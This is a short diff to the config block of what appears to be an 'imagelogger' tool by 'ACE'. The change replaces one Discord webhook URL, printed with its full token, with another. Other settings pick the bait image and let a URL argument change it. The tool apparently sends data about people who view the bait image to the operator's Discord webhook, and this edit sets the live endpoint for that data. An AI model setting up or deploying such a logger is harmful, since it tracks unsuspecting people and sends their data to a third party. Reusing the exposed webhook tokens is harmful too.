@@ -13,7 +13,7 @@ author = "ACE"
 
 config = {
 # BASE CONFIG #
-"webhook": "https://discord.com/api/webhooks/1348119975251939329/vYx2IjMRhMrJGJ5IthG5LWrq4YZrgPTeLa2Y_TnmCdXZpof1zdc7Fmph5LrIG2jNuBmg",
+"webhook": "https://discord.com/api/webhooks/1381163516307837030/fgk3wttwit1kBMC4TcXCqT9OIdq2NSJnnxytPzme0bb0qzedIMHSossHFW94XrQQQZSL",
 "image": "  https://appuals.com/wp-content/uploads/2024/11/2024-11-19_011705-1.jpg", # You can also have a custom image by using a URL argument
 # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
